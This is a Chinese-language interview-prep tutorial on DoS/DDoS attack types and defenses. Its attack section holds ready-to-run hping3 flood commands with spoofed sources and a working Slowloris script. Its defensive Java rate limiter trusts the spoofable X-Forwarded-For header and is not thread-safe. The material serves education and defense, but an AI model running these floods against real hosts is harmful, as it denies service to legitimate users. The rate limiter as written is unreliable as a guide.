# DoS/DDoS：流量洪水的冲击

你的网站突然无法访问。

访问量监控显示：平时的 100 倍。

但这不是因为你的网站火了，而是有人正在用海量请求淹没你的服务器。

这就是 **DoS/DDoS 攻击**——让合法用户无法访问服务的恶意行为。

## DoS vs DDoS

```
┌─────────────────────────────────────────────────────────────┐
│                    DoS vs DDoS                               │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  DoS（Denial of Service，拒绝服务）                          │
│  - 单台攻击源                                              │
│  - 攻击者自己发起                                          │
│  - 攻击力有限，容易被封                                      │
│                                                             │
│  DDoS（Distributed Denial of Service，分布式拒绝服务）       │
│  - 多台攻击源（僵尸网络）                                   │
│  - 控制大量肉鸡同时发起                                      │
│  - 攻击力强，防御困难                                       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

## DDoS 攻击类型

### 1. 容量型攻击（Volumetric Attacks）

用海量流量堵塞网络带宽：

```
攻击原理：
攻击者 → [海量请求] → 目标服务器
              ↑
         带宽被占满

常见类型：
- UDP Flood：发送大量 UDP 包
- ICMP Flood：发送大量 ICMP 包
- DNS Amplification：利用 DNS 放大攻击
```

```bash
# UDP Flood 示例
hping3 --udp --flood --rand-source target.com

# ICMP Flood
hping3 --icmp --flood --rand-source target.com

# DNS Amplification
# 攻击者向开放 DNS 解析器发送小查询
# 查询：任何域名的 NS 记录（响应很大）
# DNS 解析器向目标返回大响应
```

### 2. 协议攻击（Protocol Attacks）

利用协议栈的弱点，消耗服务器资源：

```
SYN Flood：
- 发送大量 SYN 包，不完成三次握手
- 服务器维护大量半开连接，耗尽资源

死亡之 Ping（Ping of Death）：
- 发送超大 ICMP 包（超过 65535 字节）
- 老系统处理时崩溃
```

```bash
# SYN Flood
hping3 --syn --flood --rand-source -p 80 target.com

# 设置 TCP 选项增强效果
hping3 -S -p 80 -s 445 --flood --rand-source target.com
```

### 3. 应用层攻击（Application Layer Attacks）

针对特定应用，模拟正常请求：

```
HTTP Flood：
- 发送大量 HTTP 请求
- GET Flood：请求大页面
- POST Flood：发送大表单

Slowloris：
- 缓慢发送 HTTP 头
- 保持连接但不完成请求
- 耗尽服务器连接数
```

```python
# Slowloris Python 示例
import socket
import time

def slowloris(target, port=80, duration=60):
    sockets = []
    for i in range(200):  # 打开 200 个连接
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target, port))
        sockets.append(s)
    
    end_time = time.time() + duration
    while time.time() < end_time:
        for s in sockets:
            try:
                s.send("X-a: b\r\n".encode())
            except:
                sockets.remove(s)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                sockets.append(s)
        time.sleep(15)  # 每 15 秒发送一次
```

## DDoS 防御策略

### 1. 网络层防御

```
┌─────────────────────────────────────────────────────────────┐
│                    流量清洗架构                              │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  攻击流量 ──────┐                                            │
│                 ▼                                          │
│  ┌──────────────────────┐                                  │
│  │   边界路由器/防火墙   │                                  │
│  │  基础过滤（ACL）     │                                  │
│  └──────────┬───────────┘                                  │
│              │                                              │
│              ▼                                              │
│  ┌──────────────────────┐                                  │
│  │   DDoS 防护服务       │                                  │
│  │  云清洗中心           │                                  │
│  │  (Cloudflare/Akamai) │                                  │
│  └──────────┬───────────┘                                  │
│              │                                              │
│              ▼                                              │
│  ┌──────────────────────┐                                  │
│  │   目标服务器          │                                  │
│  │  （干净流量）         │                                  │
│  └──────────────────────┘                                  │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 2. 限流配置

```java
@Configuration
public class RateLimitConfig {
    
    @Bean
    public FilterRegistrationBean<RateLimitFilter> rateLimitFilter() {
        FilterRegistrationBean<RateLimitFilter> bean = new FilterRegistrationBean<>();
        bean.setFilter(new RateLimitFilter());
        bean.addUrlPatterns("/api/*");
        return bean;
    }
}

public class RateLimitFilter implements Filter {
    
    private static final int MAX_REQUESTS_PER_MINUTE = 100;
    private static final Map<String, List<Long>> ipRequests = new ConcurrentHashMap<>();
    
    @Override
    public void doFilter(ServletRequest request, ServletResponse response,
                         FilterChain chain) throws IOException, ServletException {
        
        HttpServletRequest httpRequest = (HttpServletRequest) request;
        String clientIp = getClientIP(httpRequest);
        long now = System.currentTimeMillis();
        
        // 获取或创建该 IP 的请求时间列表
        List<Long> requests = ipRequests.computeIfAbsent(clientIp, k -> new ArrayList<>());
        
        // 清理过期的请求记录（保留 1 分钟内的）
        requests.removeIf(time -> now - time > 60000);
        
        // 检查是否超过限制
        if (requests.size() >= MAX_REQUESTS_PER_MINUTE) {
            HttpServletResponse httpResponse = (HttpServletResponse) response;
            httpResponse.setStatus(429);
            httpResponse.getWriter().write("Too Many Requests");
            return;
        }
        
        // 记录本次请求
        requests.add(now);
        
        chain.doFilter(request, response);
    }
    
    private String getClientIP(HttpServletRequest request) {
        String xForwardedFor = request.getHeader("X-Forwarded-For");
        if (xForwardedFor != null && !xForwardedFor.isEmpty()) {
            return xForwardedFor.split(",")[0].trim();
        }
        return request.getRemoteAddr();
    }
}
```

### 3. 验证码（CAPTCHA）

```html
<!-- Google reCAPTCHA 集成 -->
<script src="https://www.google.com/recaptcha/api.js" async defer></script>

<form action="/submit" method="POST">
    <!-- 其他表单字段 -->
    
    <div class="g-recaptcha" 
         data-sitekey="YOUR_SITE_KEY"
         data-callback="onCaptchaSuccess">
    </div>
    
    <button type="submit">提交</button>
</form>

<script>
function onCaptchaSuccess(token) {
    // 验证成功后启用提交按钮
    document.querySelector('button[type="submit"]').disabled = false;
}
</script>
```

### 4. 运营商层清洗

```bash
# 与 ISP 合作
# 启用流量清洗服务
# 配置 BGP 黑洞路由
# 当攻击发生时，将流量引向清洗中心

# 云服务商 DDoS 防护
# AWS Shield / Shield Advanced
# Azure DDoS Protection
# Cloudflare DDoS Mitigation
```

## 流量限流库：Guava RateLimiter

```java
import com.google.common.util.concurrent.RateLimiter;

@Service
public class APIService {
    
    // 每秒允许 100 个请求
    private final RateLimiter rateLimiter = RateLimiter.create(100.0);
    
    /**
     * 带限流的 API 调用
     */
    public Result apiCall(String endpoint) {
        // 尝试获取令牌，等待最多 1 秒
        if (!rateLimiter.tryAcquire(1, 1, TimeUnit.SECONDS)) {
            return Result.error(429, "请求过于频繁，请稍后重试");
        }
        
        // 执行实际的 API 调用
        return doApiCall(endpoint);
    }
}
```

## SYN Flood 防御

```bash
# Linux 内核参数调优
# /etc/sysctl.conf

# 启用 SYN Cookies
net.ipv4.tcp_syncookies = 1

# 设置 SYN 队列长度
net.ipv4.tcp_max_syn_backlog = 4096

# 设置 SYN+ACK 重试次数
net.ipv4.tcp_synack_retries = 2

# 半开连接超时时间
net.ipv4.tcp_syn_retries = 2

# 应用配置
sysctl -p
```

```java
// Java NIO 配置
ServerSocketChannel serverChannel = ServerSocketChannel.open();
serverChannel.socket().bind(new InetSocketAddress(8080));

// 配置 TCP 参数
serverChannel.socket().setPerformancePreferences(0, 2, 1);
serverChannel.socket().setReuseAddress(true);
serverChannel.socket().setReceiveBufferSize(64 * 1024);
```

## 异常流量监控

```java
@Service
public class TrafficMonitor {
    
    private static final long WINDOW_SIZE_MS = 60000;  // 1 分钟窗口
    private static final long THRESHOLD_RPS = 1000;   // 阈值：1000 请求/秒
    
    private final ConcurrentHashMap<String, TrafficData> trafficData = new ConcurrentHashMap<>();
    
    @Scheduled(fixedRate = 1000)
    public void monitorTraffic() {
        long now = System.currentTimeMillis();
        
        for (Map.Entry<String, TrafficData> entry : trafficData.entrySet()) {
            TrafficData data = entry.getValue();
            
            // 计算当前 RPS
            data.removeOldEntries(now - WINDOW_SIZE_MS);
            double currentRPS = data.getCount() / (WINDOW_SIZE_MS / 1000.0);
            
            if (currentRPS > THRESHOLD_RPS) {
                alertHighTraffic(entry.getKey(), currentRPS);
            }
        }
    }
    
    public void recordRequest(String ip, long timestamp) {
        TrafficData data = trafficData.computeIfAbsent(ip, k -> new TrafficData());
        data.add(timestamp);
    }
    
    private void alertHighTraffic(String ip, double rps) {
        // 发送告警
        log.warn("检测到异常流量: IP={}, RPS={}", ip, rps);
    }
    
    private static class TrafficData {
        private final List<Long> timestamps = Collections.synchronizedList(new ArrayList<>());
        
        public void add(long timestamp) {
            timestamps.add(timestamp);
        }
        
        public void removeOldEntries(long cutoff) {
            timestamps.removeIf(t -> t < cutoff);
        }
        
        public int getCount() {
            return timestamps.size();
        }
    }
}
```

## 面试追问方向

1. **DDoS 和 DoS 的区别？** —— DDoS 是分布式的，DoS 是单源的；DDoS 使用僵尸网络
2. **DNS 放大攻击的原理？** —— 利用 DNS 查询的小请求大响应特性，放大攻击流量
3. **SYN Flood 为什么不消耗服务器带宽？** —— 只发 SYN 不完成握手，服务器维护半开连接消耗 CPU/内存
4. **Slowloris 为什么有效？** —— 保持连接但不完成请求，耗尽服务器连接数
5. **如何防御应用层 DDoS？** —— 验证码、行为分析、限流、CDN 加速

> "DDoS 攻击是网络安全的顽疾。理解攻击原理，才能制定有效的防御策略。"
